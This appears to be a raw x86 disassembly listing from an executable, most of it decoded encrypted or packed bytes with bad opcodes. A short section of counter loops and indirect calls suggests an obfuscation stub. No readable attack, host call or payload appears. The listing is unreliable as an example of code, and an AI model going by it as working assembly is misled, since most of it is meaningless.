  40a715:	xchg   edi,eax
  40a716:	mov    ch,0x36
  40a718:	test   DWORD PTR [eax],ebx
  40a71a:	nop
  40a71b:	pop    ebx
  40a71c:	pop    ebx
  40a71d:	arpl   WORD PTR [esi+eiz*8],sp
  40a720:	pop    ss
  40a721:	ins    BYTE PTR es:[edi],dx
  40a722:	xchg   esi,eax
  40a723:	mov    ds:0x79512d1f,eax
  40a728:	mov    edx,0x3910a380
  40a72d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a72e:	jns    0x40a766
  40a730:	adc    BYTE PTR [ecx+esi*4],dl
  40a733:	sub    BYTE PTR [edi],dl
  40a735:	rcr    DWORD PTR [edi-0x372a6b27],0x4e
  40a73c:	jo     0x40a733
  40a73e:	pop    edi
  40a73f:	jo     0x40a766
  40a741:	int3   
  40a742:	(bad)  
  40a743:	mov    eax,0x568e4314
  40a748:	pop    ecx
  40a749:	pop    eax
  40a74a:	jg     0x40a74c
  40a74c:	adc    eax,0x711d1f24
  40a751:	cs ret 0x1a4b
  40a755:	adc    eax,DWORD PTR [esi+eax*2-0x4459398]
  40a75c:	mov    ecx,0xad3bdd4d
  40a761:	daa    
  40a762:	mov    bh,0x39
  40a764:	arpl   sp,sp
  40a766:	ja     0x40a7a4
  40a768:	ja     0x40a748
  40a76a:	cli    
  40a76b:	add    edx,esp
  40a76d:	sub    eax,0x9b26a14e
  40a772:	stos   DWORD PTR es:[edi],eax
  40a773:	in     al,dx
  40a774:	add    dl,al
  40a776:	xor    BYTE PTR [edx-0xa70dd7c],0x30
  40a77d:	mov    cl,0xdb
  40a77f:	xchg   ebp,eax
  40a780:	dec    eax
  40a781:	in     eax,0x5
  40a783:	out    dx,eax
  40a784:	sbb    eax,ebx
  40a786:	sbb    bh,BYTE PTR [edi-0x58c54131]
  40a78c:	(bad)  
  40a78d:	jo     0x40a720
  40a78f:	loope  0x40a7a9
  40a791:	outs   dx,DWORD PTR ds:[esi]
  40a792:	bound  ebx,QWORD PTR [edi-0x5b827fd7]
  40a798:	inc    esi
  40a799:	cs adc esi,ebx
  40a79c:	dec    esi
  40a79d:	inc    edx
  40a79e:	adc    eax,0xec107a39
  40a7a3:	rol    bh,0x28
  40a7a6:	mov    edi,ss
  40a7a8:	sbb    eax,esp
  40a7aa:	in     al,0x6b
  40a7ac:	dec    eax
  40a7ad:	pusha  
  40a7ae:	std    
  40a7af:	cmp    eax,0x609f703c
  40a7b4:	cwde   
  40a7b5:	es mov dl,0x6d
  40a7b8:	mov    ds:0x12d0c0b3,eax
  40a7bd:	(bad)  
  40a7be:	stc    
  40a7bf:	mov    bl,0x7
  40a7c1:	xchg   esi,eax
  40a7c2:	adc    esp,DWORD PTR [eax-0x668dee]
  40a7c8:	add    al,0x34
  40a7ca:	fucomip st,st(6)
  40a7cc:	dec    esi
  40a7cd:	scas   al,BYTE PTR es:[edi]
  40a7ce:	pop    edi
  40a7cf:	sbb    al,0xcc
  40a7d1:	inc    edi
  40a7d2:	cwde   
  40a7d3:	fdiv   st(0),st
  40a7d5:	mov    edi,0x88b668de
  40a7da:	jne    0x40a7ab
  40a7dc:	inc    ebp
  40a7dd:	popf   
  40a7de:	mov    edx,0x79689ec4
  40a7e3:	fs inc ebx
  40a7e5:	mov    al,ds:0x44219fdd
  40a7ea:	lods   eax,DWORD PTR ds:[esi]
  40a7eb:	jmp    0x4c9d:0xab80f4c3
  40a7f2:	push   edx
  40a7f3:	repz push ebp
  40a7f5:	lods   eax,DWORD PTR ds:[esi]
  40a7f6:	or     al,0x6c
  40a7f8:	sar    BYTE PTR fs:[edi*1+0x190ccdbb],0xb7
  40a801:	ja     0x40a830
  40a803:	loopne 0x40a7be
  40a805:	add    al,ch
  40a807:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a808:	(bad)  
  40a809:	pop    edx
  40a80a:	pushf  
  40a80b:	mov    ecx,0x6e4f59ae
  40a810:	jmp    0x40a7ca
  40a812:	cld    
  40a813:	or     eax,DWORD PTR [ecx+0x68]
  40a816:	mov    eax,ds:0x2d0919f0
  40a81b:	pop    es
  40a81c:	cli    
  40a81d:	sbb    DWORD PTR [esi+esi*8+0x6],0xfffffffc
  40a822:	dec    ebx
  40a823:	fadd   st(1),st
  40a825:	in     al,dx
  40a826:	icebp  
  40a827:	lock fdivr QWORD PTR [ebp+0x49]
  40a82b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a82c:	pop    esi
  40a82d:	jle    0x40a7bf
  40a82f:	mov    al,0xe5
  40a831:	ret    
  40a832:	rcr    ch,cl
  40a834:	sbb    BYTE PTR [ebp+0x771f8aa5],bh
  40a83a:	shl    bl,0x5a
  40a83d:	inc    edi
  40a83e:	rol    DWORD PTR ds:0x3ccbe4e7,0x89
  40a845:	popf   
  40a846:	and    esi,DWORD PTR [esi+esi*1+0x78fc1f25]
  40a84d:	lea    eax,[ebp-0x18]
  40a850:	mov    DWORD PTR [ebp-0x24],eax
  40a853:	xor    DWORD PTR ds:0x4302dd,0x5f13
  40a85d:	mov    eax,DWORD PTR [ebp-0x18]
  40a860:	and    DWORD PTR ds:0x4302e9,0x0
  40a86a:	jmp    0x40a87c
  40a86f:	mov    ebx,DWORD PTR ds:0x4302e9
  40a875:	inc    ebx
  40a876:	mov    DWORD PTR ds:0x4302e9,ebx
  40a87c:	cmp    DWORD PTR ds:0x4302e9,0x10
  40a883:	jae    0x40a8ac
  40a889:	cmp    DWORD PTR ds:0x4302e9,0x13
  40a890:	jne    0x40a8a1
  40a896:	push   0x42e77b
  40a89b:	call   DWORD PTR ds:0x42eabf
  40a8a1:	jmp    0x40a86f
  40a8a6:	and    DWORD PTR ds:0x4302e5,edx
  40a8ac:	mov    ecx,DWORD PTR [ebp-0x24]
  40a8af:	xor    eax,esi
  40a8b1:	add    DWORD PTR ds:0x43036b,0x2a87
  40a8bb:	add    eax,edi
  40a8bd:	sub    ebx,DWORD PTR ds:0x4302ed
  40a8c3:	mov    DWORD PTR [ecx],eax
  40a8c5:	and    DWORD PTR ds:0x42e654,0x0
  40a8cf:	jmp    0x40a8e1
  40a8d4:	mov    ebx,DWORD PTR ds:0x42e654
  40a8da:	inc    ebx
  40a8db:	mov    DWORD PTR ds:0x42e654,ebx
  40a8e1:	cmp    DWORD PTR ds:0x42e654,0x1d
  40a8e8:	jae    0x40ac77
  40a8ee:	cmp    DWORD PTR ds:0x42e654,0x11
  40a8f5:	jne    0x40a90b
  40a8fb:	push   0x2475
  40a900:	push   0x8142
  40a905:	call   DWORD PTR ds:0x42e887
  40a90b:	cmp    DWORD PTR ds:0x42e654,0x10
  40a912:	jne    0x40a925
  40a918:	mov    ebx,DWORD PTR ds:0x42e654
  40a91e:	inc    ebx
  40a91f:	mov    DWORD PTR ds:0x42e654,ebx
  40a925:	jmp    0x40a8d4
  40a92a:	jmp    0x40ac77
  40a92f:	fsubr  QWORD PTR [esi-0x17]
  40a932:	or     eax,0x6fd88969
  40a937:	pop    eax
  40a938:	or     BYTE PTR [edx-0x24266187],bl
  40a93e:	outs   dx,BYTE PTR ds:[esi]
  40a93f:	cdq    
  40a940:	loope  0x40a9c0
  40a942:	jle    0x40a972
  40a944:	jge    0x40a9c4
  40a946:	jle    0x40a920
  40a948:	push   esi
  40a949:	stc    
  40a94a:	jg     0x40a912
  40a94c:	sbb    dl,BYTE PTR [ebp-0x15dc479a]
  40a952:	bound  edx,QWORD PTR [edx-0x35]
  40a955:	xor    edx,DWORD PTR [esi]
  40a957:	lea    esi,[ebx+0x27]
  40a95a:	arpl   WORD PTR [esi],ax
  40a95c:	loopne 0x40a99f
  40a95e:	mov    ebx,0xd871b731
  40a963:	jb     0x40a9ce
  40a965:	mul    DWORD PTR [edi]
  40a967:	leave  
  40a968:	jmp    0x3710ae80
  40a96d:	xor    DWORD PTR cs:[esi-0x6b],edi
  40a971:	aaa    
  40a972:	stc    
  40a973:	cmp    BYTE PTR [eax],0xf
  40a976:	cmp    al,0xf5
  40a978:	adc    eax,0xd9927c9b
  40a97d:	mov    ds:0x1654f8e9,eax
  40a982:	and    bh,BYTE PTR [edi-0x2b9fc217]
  40a988:	or     DWORD PTR [edi],ebx
  40a98a:	mov    edx,0x85bc3b34
  40a98f:	pop    edi
  40a990:	pop    ebp
  40a991:	mov    ds,WORD PTR [eax+edx*4-0x3faaf8d6]
  40a998:	mov    eax,0xe8deb5a2
  40a99d:	dec    edx
  40a99e:	inc    ecx
  40a99f:	inc    esi
  40a9a0:	and    edi,DWORD PTR [eax-0x4]
  40a9a3:	and    bh,dl
  40a9a5:	nop
  40a9a6:	mov    ebx,0x62d48275
  40a9ab:	aad    0x37
  40a9ad:	pop    edi
  40a9ae:	repnz inc eax
  40a9b0:	(bad)  
  40a9b1:	out    0x4d,eax
  40a9b3:	jge    0x40a9dc
  40a9b5:	ja     0x40aa31
  40a9b7:	aas    
  40a9b8:	adc    al,0x6c
  40a9ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9bb:	popa   
  40a9bc:	and    ch,BYTE PTR [ebx-0x4c]
  40a9bf:	ss and eax,0x1479ece7
  40a9c5:	call   0x4ab3:0x61cebbab
  40a9cc:	loop   0x40a97e
  40a9ce:	shl    BYTE PTR [edi-0x8],cl
  40a9d1:	out    0x60,al
  40a9d3:	mov    esi,0xf01fa799
  40a9d8:	pop    esp
  40a9d9:	cli    
  40a9da:	cld    
  40a9db:	arpl   WORD PTR [ebp+ecx*8-0x159295a8],sp
  40a9e2:	fnstsw WORD PTR [eax]
  40a9e4:	xor    DWORD PTR [esi-0x1],ecx
  40a9e7:	inc    ebx
  40a9e8:	imul   esp,DWORD PTR [ebx-0x4a],0xefcb2778
  40a9ef:	cwde   
  40a9f0:	mov    cl,0xb3
  40a9f2:	jp     0x40a998
  40a9f4:	nop
  40a9f5:	cmp    eax,ecx
  40a9f7:	sbb    DWORD PTR [eax+0x7d],esi
  40a9fa:	cmp    cl,BYTE PTR [edi+0x482eff3c]
  40aa00:	and    bh,BYTE PTR [ecx+0xb]
  40aa03:	out    dx,al
  40aa04:	popa   
  40aa05:	sub    cl,BYTE PTR [esi]
  40aa07:	push   edi
  40aa08:	mov    ebx,0x206a4e11
  40aa0d:	fidivr WORD PTR [esi]
  40aa0f:	add    BYTE PTR [esi],0x46
  40aa12:	adc    dl,BYTE PTR [esi]
  40aa14:	(bad)  
  40aa15:	push   edx
  40aa16:	popa   
  40aa17:	jb     0x40aa33
  40aa19:	and    eax,0xd74c8e62
  40aa1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aa1f:	lahf   
  40aa20:	adc    BYTE PTR [edi],dh
  40aa22:	clc    
  40aa23:	in     eax,dx
  40aa24:	xchg   cl,dh
  40aa26:	cmc    
  40aa27:	pop    ecx
  40aa28:	test   BYTE PTR [eax-0x5110b1b3],bh
  40aa2e:	retf   0x9b3c
  40aa31:	mov    DWORD PTR [edx+0x31],ecx
  40aa34:	and    eax,0x1ba5fac6
  40aa39:	shr    eax,0x7d
  40aa3c:	es test dh,bl
  40aa3f:	pop    esi
  40aa40:	adc    al,0x7b
  40aa42:	and    al,0x5b
  40aa44:	inc    eax
  40aa45:	fadd   QWORD PTR [ecx-0x503cb894]
  40aa4b:	je     0x40aa76
  40aa4d:	shrd   DWORD PTR [ecx],eax,0xc8
  40aa51:	mov    cl,0xb9
  40aa53:	imul   eax,DWORD PTR ds:[edi+0x30],0xc56db80
  40aa5b:	lock int 0xf5
  40aa5e:	sub    esi,DWORD PTR [ebp+0x454ac892]
  40aa64:	mov    al,ds:0x84731d08
  40aa69:	cmp    eax,0x8331e2ac
  40aa6e:	mov    edx,0x97beb6be
  40aa73:	pusha  
  40aa74:	push   esi
  40aa75:	shl    edi,0x3e
  40aa78:	test   ebp,eax
  40aa7a:	fld    QWORD PTR [ebx+0x66]
  40aa7d:	and    DWORD PTR [edx+0xc4cbb4e],esi
  40aa83:	xchg   esi,eax
  40aa84:	inc    ebp
  40aa85:	xchg   al,dl
  40aa87:	les    edi,FWORD PTR [eax+eax*8]
  40aa8a:	mov    al,0x34
  40aa8c:	repnz test eax,0xccd77a21
  40aa92:	jmp    0x40aabb
  40aa94:	jo     0x40aadd
  40aa96:	arpl   dx,ax
  40aa98:	mov    edi,0x858bc02e
  40aa9d:	ss (bad) 
  40aa9f:	jmp    0x9161:0x8917d70f
  40aaa6:	jmp    0x261:0xd01b184b
  40aaad:	lea    ecx,[ebx+0x79]
  40aab0:	jecxz  0x40aad6
  40aab2:	inc    edi
  40aab3:	push   ecx
  40aab4:	popf   
  40aab5:	loope  0x40aab9
  40aab7:	sbb    ebx,DWORD PTR [ebp+0x4b]
  40aaba:	imul   DWORD PTR [eax]
  40aabc:	pop    edx
  40aabd:	(bad)  
  40aabe:	shl    DWORD PTR [esi],1
  40aac0:	stos   DWORD PTR es:[edi],eax
  40aac1:	loopne 0x40aa50
  40aac3:	inc    esi
  40aac4:	mov    ds,ecx
  40aac6:	cs push esi
  40aac8:	mov    WORD PTR [edx+ebp*4],cs
  40aacb:	xor    BYTE PTR [eax],dl
  40aacd:	xchg   ebx,eax
  40aace:	add    BYTE PTR [esi+0x3891d11f],bl
  40aad4:	adc    DWORD PTR [ecx+0x73],esi
  40aad7:	push   eax
  40aad8:	std    
  40aad9:	cmp    ebp,edx
  40aadb:	iret   
  40aadc:	jmp    ebp
  40aade:	add    BYTE PTR [esi-0x694aa81a],al
  40aae4:	pop    edi
  40aae5:	loope  0x40aacc
  40aae7:	retf   0x633b
  40aaea:	or     eax,0x634b72f9
  40aaef:	xlat   BYTE PTR ds:[ebx]
  40aaf0:	mov    eax,0xecc7ef59
  40aaf5:	pop    edi
  40aaf6:	(bad)  
  40aaf7:	cmp    eax,0x16ffcc7
  40aafc:	lea    edi,ds:0xab66642d
  40ab02:	outs   dx,DWORD PTR ds:[esi]
  40ab03:	pop    esp
  40ab04:	dec    esi
  40ab05:	pop    eax
  40ab06:	adc    dh,ch
  40ab08:	ins    DWORD PTR es:[edi],dx
  40ab09:	dec    ebp
  40ab0a:	ins    DWORD PTR es:[edi],dx
  40ab0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab0c:	in     al,dx
  40ab0d:	and    dl,BYTE PTR [ebp-0x7b]
  40ab10:	mov    WORD PTR [edi-0x3a41e400],?
  40ab16:	dec    esp
  40ab17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab18:	popf   
  40ab19:	ins    DWORD PTR es:[edi],dx
  40ab1a:	or     eax,ebp
  40ab1c:	in     eax,dx
  40ab1d:	jecxz  0x40ab5c
  40ab1f:	jnp    0x40aad2
  40ab21:	(bad)  
  40ab22:	cdq    
  40ab23:	xor    DWORD PTR ds:0x41b9ffcd,0x58
  40ab2a:	inc    esi
  40ab2b:	push   ecx
  40ab2c:	xchg   edi,eax
  40ab2d:	ror    DWORD PTR [ebx+edi*8-0x3447d117],cl
  40ab34:	sti    
  40ab35:	xor    al,0xa8
  40ab37:	ins    DWORD PTR es:[edi],dx
  40ab38:	adc    DWORD PTR [esi-0x54],eax
  40ab3b:	inc    eax
  40ab3c:	mov    bl,0xb2
  40ab3e:	cmc    
  40ab3f:	mov    eax,0xf3f36418
  40ab44:	rcl    BYTE PTR [esi-0x6c],0xbe
  40ab48:	jb     0x40ab45
  40ab4a:	push   DWORD PTR [eax+0x6f0fde94]
  40ab50:	sbb    DWORD PTR [edx+0x6f9a89b2],esp
  40ab56:	dec    ebx
  40ab57:	push   ss
  40ab58:	xor    eax,0xcec0dc3c
  40ab5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab5e:	xchg   esi,eax
  40ab5f:	and    DWORD PTR ds:0x9324dc12,0x7b228e19
  40ab69:	inc    esi
  40ab6a:	pushf  
  40ab6b:	pop    edx
  40ab6c:	cmp    eax,0xc1a40d96
  40ab71:	add    esp,esp
  40ab73:	loope  0x40ab5d
  40ab75:	pop    ebp
  40ab76:	ins    DWORD PTR es:[edi],dx
  40ab77:	cdq    
  40ab78:	xchg   edi,eax
  40ab79:	push   cs
  40ab7a:	lahf   
  40ab7b:	(bad)  
  40ab7c:	fidiv  DWORD PTR [esi+0x7739be3]
  40ab82:	ins    BYTE PTR es:[edi],dx
  40ab83:	retf   
  40ab84:	add    BYTE PTR [ebp+0x7c26e528],dh
  40ab8a:	cmp    DWORD PTR [esi+0x45],0xfffffff0
  40ab8e:	sub    bh,BYTE PTR [ecx-0x6f]
  40ab91:	call   FWORD PTR [ebx+edi*4-0x6d]
  40ab95:	and    BYTE PTR [ebx-0x117155c7],al
  40ab9b:	push   0xffffffe5
  40ab9d:	mov    edi,0xd135e46b
  40aba2:	sbb    BYTE PTR [edx-0x1843fd63],cl
  40aba8:	(bad)  
  40aba9:	sub    DWORD PTR [edi+0x534f4b36],ecx
  40abaf:	dec    eax
  40abb0:	xchg   ebx,eax
  40abb1:	test   BYTE PTR [eax],0xe9
  40abb4:	stos   DWORD PTR es:[edi],eax
  40abb5:	mov    al,ds:0xe555538e
  40abba:	push   ebx
  40abbb:	pusha  
  40abbc:	add    DWORD PTR [edi],ebx
  40abbe:	gs sbb eax,0x86f95960
  40abc4:	mov    dh,0x3d
  40abc6:	or     al,cl
  40abc8:	in     al,dx
  40abc9:	mov    edx,0xbd987144
  40abce:	ja     0x40ab5b
  40abd0:	and    BYTE PTR [edx+edx*1],bh
  40abd3:	push   eax
  40abd4:	loopne 0x40abef
  40abd6:	pop    edi
  40abd7:	mov    ah,ah
  40abd9:	sbb    ecx,eax
  40abdb:	jmp    0x40ac14
  40abdd:	in     eax,0xbd
  40abdf:	and    ebp,DWORD PTR gs:[eax-0x52]
  40abe3:	(bad)  
  40abe4:	hlt    
  40abe5:	std    
  40abe6:	faddp  st(4),st
  40abe8:	pusha  
  40abe9:	add    eax,0x4aa0e596
  40abee:	dec    edx
  40abef:	push   ebp
  40abf0:	hlt    
  40abf1:	fs je  0x40abdb
  40abf4:	mov    ah,0x27
  40abf6:	push   es
  40abf7:	daa    
  40abf8:	sbb    al,0x3c
  40abfa:	loop   0x40ac13
  40abfc:	mov    eax,0x5f751610
  40ac01:	dec    esi
  40ac02:	add    esi,DWORD PTR [ebx]
  40ac04:	test   bh,0x47
  40ac07:	mov    edi,0xd86f4a3f
  40ac0c:	iret   
  40ac0d:	cmp    al,0x71
  40ac0f:	add    edx,DWORD PTR [edx+0x68667bb8]
  40ac15:	stos   DWORD PTR es:[edi],eax
  40ac16:	mul    al
  40ac18:	and    al,0x2
  40ac1a:	sti    
  40ac1b:	fcomp  DWORD PTR [eax-0x55a06fcd]
  40ac21:	bound  esp,QWORD PTR [eax]
  40ac23:	call   ebx
  40ac25:	pop    esp
  40ac26:	lahf   
  40ac27:	and    BYTE PTR [ecx],0x16
  40ac2a:	aad    0x91
  40ac2c:	retf   
  40ac2d:	jae    0x40ac89
  40ac2f:	xor    BYTE PTR [edi-0x6],dl
  40ac32:	pop    ecx
  40ac33:	imul   DWORD PTR [edi+0x4f]
  40ac36:	aas    
  40ac37:	sub    eax,0x26791616
  40ac3c:	int    0xc0
  40ac3e:	mov    ebp,0x6e432bba
  40ac43:	and    DWORD PTR [eax+0x2c5953ac],0x6d
  40ac4a:	push   ecx
  40ac4b:	loop   0x40ac7a
  40ac4d:	cmp    DWORD PTR [esi+0x62],esi
  40ac50:	pop    esi
  40ac51:	pop    ebx
  40ac52:	ds xor al,0x1c
  40ac55:	mov    eax,ds:0xf219c843
  40ac5a:	lahf   
  40ac5b:	push   eax
  40ac5c:	jl     0x40abf3
  40ac5e:	sub    bh,BYTE PTR [edx-0x2c]
  40ac61:	movntq QWORD PTR [edi+0x50],mm5
  40ac65:	add    dl,0x8d
  40ac68:	pop    ecx
  40ac69:	or     cl,BYTE PTR [edx+0x44]
  40ac6c:	mov    dl,BYTE PTR [eax+edx*4+0x31345356]
  40ac73:	cmp    ch,BYTE PTR [edi+0x66]
  40ac76:	retf   
  40ac77:	mov    eax,ds:0x41227c
  40ac7c:	mov    ebx,0x8e12feb8
  40ac81:	jmp    0x40afce
  40ac86:	leave  
  40ac87:	inc    edx
  40ac88:	mov    ebp,0xd1515553
  40ac8d:	inc    eax
  40ac8e:	xor    ch,ah
  40ac90:	icebp  
  40ac91:	pushf  
  40ac92:	sbb    esp,DWORD PTR [eax-0x13b6000c]
  40ac98:	jle    0x40ad18
  40ac9a:	cs jge 0x40ad1b
  40ac9d:	jle    0x40ac49
  40ac9f:	pop    edi
  40aca0:	mov    eax,ds:0xc74115db
  40aca5:	dec    edx
  40aca6:	js     0x40ac30
  40aca8:	retf   
  40aca9:	cmp    ah,BYTE PTR [esi+0x79345b5b]
  40acaf:	dec    esp
  40acb0:	out    dx,eax
  40acb1:	add    dl,BYTE PTR [ecx-0x67]
  40acb4:	outs   dx,DWORD PTR ds:[esi]
  40acb5:	int3   
  40acb6:	stos   DWORD PTR es:[edi],eax
  40acb7:	aad    0x23
  40acb9:	cld    
  40acba:	in     eax,dx
  40acbb:	jp     0x40ad10
  40acbd:	ror    bl,1
  40acbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acc0:	xlat   BYTE PTR ds:[ebx]
  40acc1:	fisub  DWORD PTR [ebx+eax*8-0x54]
  40acc5:	ret    0x8fd0
  40acc8:	sbb    DWORD PTR [edi],edx
  40acca:	jnp    0x40acfa
  40accc:	ret    0x19b
  40accf:	sbb    DWORD PTR [edx-0x5c],0x5c
  40acd3:	pop    ss
  40acd4:	pop    eax
  40acd5:	jb     0x40ac66
  40acd7:	or     BYTE PTR [edi-0x19c53a08],al
  40acdd:	xor    DWORD PTR [ecx],esi
  40acdf:	rol    DWORD PTR [eax+0x6445b7af],1
  40ace5:	pop    esi
  40ace6:	les    ebx,FWORD PTR [ebx]
  40ace8:	xchg   ebx,eax
  40ace9:	push   esi
  40acea:	call   0xe95de6dc
  40acef:	popf   
  40acf0:	mov    al,ds:0xf7284901
  40acf5:	out    0xd7,eax
  40acf7:	adc    al,0x41
  40acf9:	and    esi,DWORD PTR [esi]
  40acfb:	cmp    DWORD PTR [esi-0x3b],eax
  40acfe:	arpl   WORD PTR [eax+0x2e164726],bx
  40ad04:	mov    eax,0xa4bf3ce5
  40ad09:	pop    edx
  40ad0a:	aad    0xb5
  40ad0c:	jb     0x40ad76
  40ad0e:	shl    BYTE PTR [esi],cl
  40ad10:	add    ch,BYTE PTR [edx-0x64]
  40ad13:	adc    BYTE PTR [eax+eiz*1-0x67],0xd7
  40ad18:	fwait
  40ad19:	sbb    bh,BYTE PTR [esi-0x1097a2c]
  40ad1f:	and    ah,BYTE PTR [edx+edi*1]
  40ad22:	adc    bl,BYTE PTR [ebx]
  40ad24:	push   esp
  40ad25:	jno    0x40ad41
  40ad27:	jo     0x40ad81
  40ad29:	adc    al,0x4d
  40ad2b:	arpl   WORD PTR [eax],dx
  40ad2d:	adc    al,0xe9
  40ad2f:	scas   al,BYTE PTR es:[edi]
  40ad30:	cmp    dh,BYTE PTR [ebx-0x42]
  40ad33:	pop    ebp
  40ad34:	out    0xd6,eax
  40ad36:	xor    eax,0xcdb50e6e
  40ad3b:	mov    dl,0xf4
  40ad3d:	inc    eax
  40ad3e:	adc    esi,0xbfab5b25
  40ad44:	inc    esp
  40ad45:	cmp    BYTE PTR [edx+0xc0c91de],al
  40ad4b:	icebp  
  40ad4c:	dec    ecx
  40ad4d:	push   0xffffffbe
  40ad4f:	adc    cl,0xbc
  40ad52:	inc    esp
  40ad53:	jle    0x40ad70
  40ad55:	scas   al,BYTE PTR es:[edi]
  40ad56:	jae    0x40ad62
  40ad58:	(bad)  
  40ad59:	dec    eax
  40ad5a:	or     bl,0x62
  40ad5d:	cs pop ebx
  40ad5f:	mov    BYTE PTR [edi],cl
  40ad61:	dec    ebp
  40ad62:	add    al,0xd4
  40ad64:	call   0xe4c96f01
  40ad69:	pop    eax
  40ad6a:	gs call 0x80e1573e
  40ad70:	and    ebp,DWORD PTR [ebx]
  40ad72:	mov    cl,0xfe
  40ad74:	clc    
  40ad75:	sbb    eax,0xc570527c
  40ad7a:	and    al,0x88
  40ad7c:	test   BYTE PTR [esi+0x1ec8ac39],ah
  40ad82:	and    ah,BYTE PTR [eax]
  40ad84:	push   ds
  40ad85:	mov    DWORD PTR [eax],eax
  40ad87:	push   bp
  40ad89:	sbb    edi,eax
  40ad8b:	push   0x40
  40ad8d:	add    ebp,DWORD PTR [ecx+ebx*2]
  40ad90:	(bad)  [ecx-0x68]
  40ad93:	push   0x59ce0500
  40ad98:	add    dh,BYTE PTR [esi]
  40ad9a:	test   eax,0x894b049c
  40ad9f:	pop    ds
  40ada0:	jmp    0xbdc4fa1a
  40ada5:	and    ebx,DWORD PTR [esi-0x2]
  40ada8:	in     eax,0x9d
  40adaa:	pusha  
  40adab:	cmp    esp,ebp
  40adad:	nop
  40adae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adaf:	jecxz  0x40adcf
  40adb1:	imul   esi,DWORD PTR [edi],0x26fd65fd
  40adb7:	rcl    dh,cl
  40adb9:	rcl    ah,1
  40adbb:	sbb    cl,cl
  40adbd:	(bad)  
  40adbe:	mov    ebx,ecx
  40adc0:	popf   
  40adc1:	mov    ch,0x94
  40adc3:	mov    ecx,0xc6e6b163
  40adc8:	dec    eax
  40adc9:	out    dx,eax
  40adca:	test   DWORD PTR [ecx+0x38],eax
  40adcd:	fadd   DWORD PTR [edi]
  40adcf:	mov    eax,0x2906dce5
  40add4:	out    0x0,eax
  40add6:	push   0xffffffe9
  40add8:	lods   eax,DWORD PTR ds:[esi]
  40add9:	adc    ecx,esi
  40addb:	inc    edx
  40addc:	dec    si
  40adde:	xchg   ecx,eax
  40addf:	fld    DWORD PTR [ebx+ecx*8+0xde96214]
  40ade6:	fwait
  40ade7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ade8:	xor    DWORD PTR [eax+0x6],edi
  40adeb:	push   esp
  40adec:	fsubp  st(6),st
  40adee:	cwde   
  40adef:	xchg   ebp,eax
  40adf0:	aam    0x8f
  40adf2:	sub    DWORD PTR [ebx],ebx
  40adf4:	pop    eax
  40adf5:	mov    bh,0x4b
  40adf7:	mov    ah,0xba
  40adf9:	cdq    
  40adfa:	shl    DWORD PTR [ebx],0x6c
  40adfd:	and    BYTE PTR [esi],dh
  40adff:	push   es
  40ae00:	mov    esi,0xe5728a39
  40ae05:	mov    eax,0x54f4f103
  40ae0a:	(bad)  
  40ae0b:	push   edi
  40ae0c:	imul   ecx,DWORD PTR [edi+0x6b730560],0xc4701f63
  40ae16:	call   0x22875936
  40ae1b:	es aad 0xee
  40ae1e:	jmp    0xfc8e096
  40ae23:	xchg   dh,ah
  40ae25:	inc    ebp
  40ae26:	fcomp  QWORD PTR [ecx]
  40ae28:	mov    ebp,0xc52c60a6
  40ae2d:	cmp    DWORD PTR [eax+0x1c570991],ebp
  40ae33:	push   es
  40ae34:	pushf  
  40ae35:	or     eax,DWORD PTR [esi+0x2b]
  40ae38:	outs   dx,DWORD PTR ds:[esi]
  40ae39:	jae    0x40ae37
  40ae3b:	mov    eax,0x19da3e91
  40ae40:	fdiv   DWORD PTR [edi+0x57ed3973]
  40ae46:	mov    ecx,0x2a6fb6b0
  40ae4b:	xor    al,BYTE PTR [ecx+0x78dde7be]
  40ae51:	push   esi
  40ae52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ae53:	jmp    0x40ade6
  40ae55:	fild   DWORD PTR [edi-0x23]
  40ae58:	(bad)  
  40ae59:	into   
  40ae5a:	dec    ebp
  40ae5b:	jle    0x40ae85
  40ae5d:	adc    al,0x46
  40ae5f:	inc    esi
  40ae60:	sub    eax,0xebaede41
  40ae65:	aaa    
  40ae66:	mov    BYTE PTR [ecx-0x71],ch
  40ae69:	mov    dl,0xe9
  40ae6b:	shl    DWORD PTR [esi-0x5d],0x9a
  40ae6f:	xor    ebp,DWORD PTR [edi+0x31]
  40ae72:	adc    edi,ebp
  40ae74:	push   cs
  40ae75:	push   ebp
  40ae76:	in     eax,dx
  40ae77:	pop    edx
  40ae78:	mov    dh,0x5c
  40ae7a:	mov    ss,WORD PTR [ebp-0x1b]
  40ae7d:	stc    
  40ae7e:	add    DWORD PTR [ebx-0x33a80b5e],0xfffffff7
  40ae85:	mov    dl,0x2e
  40ae87:	pop    es
  40ae88:	in     al,0x26
  40ae8a:	jge    0x40ae58
  40ae8c:	inc    esp
  40ae8d:	add    al,0x9a
  40ae8f:	cdq    
  40ae90:	ret    
  40ae91:	pop    edx
  40ae92:	std    
  40ae93:	push   eax
  40ae94:	jmp    0xf90:0xada36460
  40ae9b:	sbb    edi,ebp
  40ae9d:	add    al,0x6b
  40ae9f:	xor    dh,BYTE PTR cs:[ecx-0x41697c56]
  40aea6:	repnz sub DWORD PTR [edx-0x151c296d],esp
  40aead:	out    dx,eax
  40aeae:	push   ds
  40aeaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aeb0:	rcl    BYTE PTR [edx+0x5001e6d4],1
  40aeb6:	outs   dx,DWORD PTR ds:[esi]
  40aeb7:	std    
  40aeb8:	xor    edx,DWORD PTR [esp+eax*2]
  40aebb:	ret    
  40aebc:	iret   
  40aebd:	mov    esi,0xef326386
  40aec2:	cs popa 
  40aec4:	pop    ebp
  40aec5:	jno    0x40aeef
  40aec7:	xchg   ebx,eax
  40aec8:	or     BYTE PTR [ecx+0x56f5dd95],0x8b
  40aecf:	sbb    BYTE PTR [esi-0x7a3eabde],0x78
  40aed6:	push   edx
  40aed7:	mov    esp,DWORD PTR [ebp-0x2b452710]
  40aedd:	push   edx
  40aede:	lahf   
